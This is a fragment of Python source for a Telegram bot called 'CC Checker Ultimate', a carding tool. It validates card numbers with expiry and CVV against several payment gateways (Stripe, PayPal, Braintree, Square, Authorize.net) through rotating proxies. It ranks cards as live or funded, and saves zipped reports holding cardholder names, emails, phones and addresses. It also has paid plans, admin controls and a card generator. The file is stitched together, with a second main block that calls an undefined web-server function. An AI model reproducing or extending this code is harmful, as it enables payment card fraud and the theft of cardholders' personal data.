            # Check if already exists
            existing = db.query(Proxy).filter(Proxy.proxy_string == proxy_str).first()
            if not existing:
                proxy = Proxy(proxy_string=proxy_str, proxy_type=proxy_type)
                db.add(proxy)
                added += 1
        
        db.commit()
        db.close()
        
        # Reload proxy pool
        load_proxies()
        
        await update.message.reply_text(f"✅ Added {added} proxies!\n\nTotal proxies: {len(proxy_pool)}")
        os.remove(file_path)
        user_sessions.pop(update.effective_user.id, None)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
        if os.path.exists(file_path):
            os.remove(file_path)


# CALLBACK HANDLER - BUTTON ROUTER
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    # Main menu
    if data == "start":
        await start(update, context)
    
    # Help & features
    elif data == "help":
        await help_cmd(update, context)
    elif data == "premium_features":
        await premium_features(update, context)
    elif data == "my_stats":
        await my_stats(update, context)
    
    # Check handlers
    elif data == "check_single":
        await check_single_handler(update, context)
    elif data == "bulk_check":
        await bulk_check_handler(update, context)
    elif data == "bin_lookup":
        await bin_lookup_handler(update, context)
    elif data == "generate":
        await generate_handler(update, context)
    elif data == "sk_check":
        await sk_check_handler(update, context)
    elif data == "multi_gateway" or data == "multi_gateway_check":
        await multi_gateway_handler(update, context)
    
    # Gateway handlers - removed (Stripe only now)
    elif data.startswith("gateway_"):
        gateway = data.replace("gateway_", "")
        await gateway_check_handler(update, context, gateway)
    
    # Buy plan
    elif data == "buy_plan":
        await buy_plan(update, context)
    elif data.startswith("buyplan_"):
        plan_id = int(data.replace("buyplan_", ""))
        await process_buy_plan(update, context, plan_id)
    
    # Admin panel
    elif data == "admin":
        await admin_panel(update, context)
    elif data == "admin_users":
        await admin_users(update, context)
    elif data == "admin_plans":
        await admin_plans(update, context)
    elif data == "admin_payments":
        await admin_payments(update, context)
    elif data == "admin_proxies":
        await admin_proxies(update, context)
    elif data == "admin_analytics":
        await admin_analytics(update, context)
    elif data == "upload_proxies_btn":
        text = "📤 **Upload Proxies**\n\nSend me a .txt file with your proxies.\n\n**Supported formats:**\n• http://proxy:port\n• user:pass@proxy:port\n• socks5://proxy:port\n• IP:PORT\n\nOne proxy per line!"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="admin_proxies")]]
        user_sessions[update.effective_user.id] = {"action": "upload_proxies"}
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


# MAIN RUN BOT
def run_bot():
    # Load proxies on startup
    print("Loading proxies...")
    proxy_count = load_proxies()
    print(f"✅ Loaded {proxy_count} proxies!")
    
    # Custom request with longer timeouts
    request = HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0
    )
    
    app = Application.builder().token(BOT_TOKEN).request(request).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("stop", stop_bulk))
    app.add_handler(CommandHandler("pause", pause_bulk))
    app.add_handler(CommandHandler("resume", resume_bulk))
    app.add_handler(CommandHandler("createplan", createplan_cmd))
    app.add_handler(CommandHandler("addadmin", addadmin_cmd))
    app.add_handler(CommandHandler("addvip", addvip_cmd))
    app.add_handler(CommandHandler("addproxies", addproxies_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    
    # Callback handler
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, document_handler))
    
    print("=" * 60)
    print("✅ CC Checker Ultimate STARTED!")
    print("=" * 60)
    print(f"Owner ID: {OWNER_ID}")
    print(f"Proxies: {proxy_count}")
    print(f"Results Channel: {RESULTS_CHANNEL or 'Not set'}")
    print("All features loaded!")
    print("=" * 60)
    
    app.run_polling()

if __name__ == "__main__":
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        print("❌ Error: BOT_TOKEN not set in .env file!")
        exit(1)
    
    if OWNER_ID == 0:
        print("❌ Error: OWNER_ID not set in .env file!")
        exit(1)
    
    run_bot()


# MULTI-GATEWAY CHECKER - PREMIUM FEATURE
async def check_all_gateways(cc, mm, yy, cvv, proxy=None):
    """Check card on ALL gateways and return detailed results"""
    results = {}
    
    # Check all gateways in parallel
    tasks = [
        ('Stripe', check_stripe(cc, mm, yy, cvv, proxy)),
        ('PayPal', check_paypal(cc, mm, yy, cvv, proxy)),
        ('Authorize.net', check_authorize(cc, mm, yy, cvv, proxy)),
        ('Braintree', check_braintree(cc, mm, yy, cvv, proxy)),
        ('Square', check_square(cc, mm, yy, cvv, proxy))
    ]
    
    for gateway_name, task in tasks:
        try:
            result = await task
            results[gateway_name] = result
        except:
            results[gateway_name] = {
                'status': 'ERROR',
                'emoji': '⚠️',
                'message': 'Check Failed',
                'response': 'Gateway timeout',
                'code': 'error'
            }
    
    # Find best result (LIVE > INSUFFICIENT_FUNDS > INCORRECT_CVC > DEAD)
    priority = {'LIVE': 4, 'INSUFFICIENT_FUNDS': 3, 'INCORRECT_CVC': 2, 'DEAD': 1, 'ERROR': 0}
    best_gateway = max(results.items(), key=lambda x: priority.get(x[1]['status'], 0))
    
    return {
        'all_results': results,
        'best_gateway': best_gateway[0],
        'best_result': best_gateway[1]
    }

async def save_multi_gateway_results(cc, mm, yy, cvv, all_results, bin_info, parsed_info, user_id):
    """Save results from all gateways to separate files and create ZIP"""
    import zipfile
    
    timestamp = int(datetime.utcnow().timestamp())
    folder = f"multi_check_{user_id}_{timestamp}"
    os.makedirs(folder, exist_ok=True)
    
    card_info = f"{cc}|{mm}|{yy}|{cvv}"
    
    # Create file for each gateway
    for gateway, result in all_results.items():
        filename = f"{folder}/{gateway.replace('.', '_').lower()}_result.txt"
        with open(filename, 'w') as f:
            f.write(f"{'='*60}\n")
            f.write(f"GATEWAY: {gateway}\n")
            f.write(f"{'='*60}\n\n")
            f.write(f"Card: {card_info}\n\n")
            
            # BIN Info
            f.write(f"BIN INFORMATION:\n")
            f.write(f"Bank: {bin_info['bank']}\n")
            f.write(f"Country: {bin_info['country']} {bin_info['emoji']}\n")
            f.write(f"Brand: {bin_info['brand']}\n")
            f.write(f"Type: {bin_info['type']}\n")
            f.write(f"Level: {bin_info['level']}\n\n")
            
            # Cardholder Info if available
            if parsed_info.get('name'):
                f.write(f"CARDHOLDER INFORMATION:\n")
                if parsed_info.get('name'):
                    f.write(f"Name: {parsed_info['name']}\n")
                if parsed_info.get('email'):
                    f.write(f"Email: {parsed_info['email']}\n")
                if parsed_info.get('phone'):
                    f.write(f"Phone: {parsed_info['phone']}\n")
                if parsed_info.get('address'):
                    f.write(f"Address: {parsed_info['address']}\n")
                if parsed_info.get('city'):
                    f.write(f"City: {parsed_info['city']}\n")
                if parsed_info.get('state'):
                    f.write(f"State: {parsed_info['state']}\n")
                if parsed_info.get('zip'):
                    f.write(f"ZIP: {parsed_info['zip']}\n")
                if parsed_info.get('country'):
                    f.write(f"Country: {parsed_info['country']}\n")
                f.write(f"\n")
            
            # Gateway Result
            f.write(f"CHECK RESULT:\n")
            f.write(f"Status: {result['status']}\n")
            f.write(f"Message: {result['message']}\n")
            f.write(f"Response: {result['response']}\n")
            f.write(f"Code: {result['code']}\n")
            f.write(f"\n{'='*60}\n")
    
    # Create summary file
    summary_file = f"{folder}/SUMMARY.txt"
    with open(summary_file, 'w') as f:
        f.write(f"{'='*60}\n")
        f.write(f"MULTI-GATEWAY CHECK SUMMARY\n")
        f.write(f"{'='*60}\n\n")
        f.write(f"Card: {card_info}\n")
        f.write(f"Checked: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n")
        
        f.write(f"RESULTS BY GATEWAY:\n")
        f.write(f"{'-'*60}\n")
        for gateway, result in all_results.items():
            f.write(f"{gateway:20} | {result['emoji']} {result['status']:15} | {result['message']}\n")
        
        f.write(f"\n{'='*60}\n")
        f.write(f"RECOMMENDATION: Use {list(all_results.keys())[0]} for best results\n")
        f.write(f"{'='*60}\n")
    
    # Create ZIP
    zip_file = f"multi_check_{user_id}_{timestamp}.zip"
    with zipfile.ZipFile(zip_file, 'w') as zipf:
        for root, dirs, files in os.walk(folder):
            for file in files:
                filepath = os.path.join(root, file)
                zipf.write(filepath, os.path.basename(filepath))
    
    # Cleanup folder
    import shutil
    shutil.rmtree(folder)
    
    return zip_file
    # Bloque de inicio automático para Render
if __name__ == "__main__":
    # Arrancamos el servidor web en segundo plano
    web_thread = threading.Thread(target=start_checker_web_server, daemon=True)
    web_thread.start()
    
    # Ejecutamos el bot principal
    run_bot()

